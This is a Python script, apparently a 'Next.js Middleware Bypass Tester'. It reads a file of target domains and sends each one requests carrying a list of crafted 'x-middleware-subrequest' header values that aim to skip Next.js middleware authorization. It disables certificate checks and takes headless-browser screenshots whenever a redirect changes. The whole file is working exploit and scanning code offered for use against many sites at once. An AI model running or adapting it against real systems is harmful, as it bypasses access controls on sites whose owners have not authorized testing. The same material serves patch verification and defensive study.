import requests
import argparse
import time
import os
from urllib.parse import urlparse
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Updated Bypass headers with additional variations
BYPASS_HEADERS = [
    "middleware:middleware:middleware:middleware:middleware",
    "middleware:root",
    "middleware:nextjs",
    "pages/_middleware",
    "_next/data",
    "middleware:rewrite:middleware",
    "middleware:middleware",
    "middleware:pages",
    "_next/data/middleware",
    "next-middleware",
    "_next/static"
]

SCREENSHOT_DIR = "screenshots"

# Create screenshot folder if not exists
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

def sanitize_filename(text):
    return text.replace("http://", "").replace("https://", "").replace("/", "_").replace(":", "_")

def setup_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=chrome_options)
    return driver

def take_screenshot(driver, url, header_val):
    try:
        driver.get(url)
        time.sleep(2)  # Wait for page to load
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        filename = f"{sanitize_filename(url)}__{sanitize_filename(header_val)}__{timestamp}.png"
        path = os.path.join(SCREENSHOT_DIR, filename)
        driver.save_screenshot(path)
        print(f"[+] Screenshot saved: {path}")
    except Exception as e:
        print(f"[-] Error taking screenshot: {e}")

def test_site(url):
    if not url.startswith("http"):
        url = "https://" + url

    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    
    print(f"\n[*] Testing: {base}")
    
    driver = setup_driver()
    
    try:
        for header_val in BYPASS_HEADERS:
            try:
                # Enhanced headers with additional fields
                headers = {
                    "x-middleware-subrequest": header_val,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1",
                    "X-Requested-With": "XMLHttpRequest",
                    "x-nextjs-data": "1",
                    "x-middleware-prefetch": "1"
                }

                print(f"\n[>] Testing URL: {base}")
                print(f"[>] Header: {header_val}")

                response = requests.get(
                    base,
                    headers=headers,
                    timeout=10,
                    allow_redirects=False,
                    verify=False
                )

                print(f"Status Code: {response.status_code}")

                # Print relevant headers
                if response.headers:
                    print("\nImportant Response Headers:")
                    for header in ['location', 'x-nextjs-match', 'x-middleware-rewrite', 'x-middleware-next']:
                        if header in response.headers:
                            print(f"{header}: {response.headers[header]}")

                if response.status_code in [301, 302, 307, 308]:
                    print("[!] Redirect Detected!")
                    print(f"[>] Redirect Location: {response.headers.get('location', 'Not specified')}")
                    take_screenshot(driver, base, header_val)
                    
                # Brief pause between requests
                time.sleep(0.5)

            except requests.RequestException as e:
                print(f"[-] Error during request: {e}")
                continue
    
    finally:
        driver.quit()

def read_sites_from_file(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Next.js Middleware Bypass Tester")
    parser.add_argument("-f", "--file", required=True, help="File with URLs/subdomains (one per line)")

    args = parser.parse_args()
    targets = read_sites_from_file(args.file)

    for site in targets:
        test_site(site)
